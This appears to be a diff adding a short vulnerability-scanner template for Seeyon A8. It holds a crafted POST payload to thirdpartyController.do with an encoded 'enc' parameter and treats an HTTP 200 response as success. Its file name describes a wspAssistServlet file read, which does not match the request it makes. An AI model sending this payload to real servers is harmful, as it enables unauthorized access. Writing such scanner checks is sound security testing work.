@@ -1,0 +1,16 @@
+name: poc-yaml-seeyon-a8-wspAssistServlet-file-read.yaml
+transport: http
+set:
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /seeyon/thirdpartyController.do
+      body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzk=&clientPath=127.0.0.1&from=ucpc
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: trganda
+  links:
+    - https://service.seeyon.com/patchtools/tp.html#/patchList
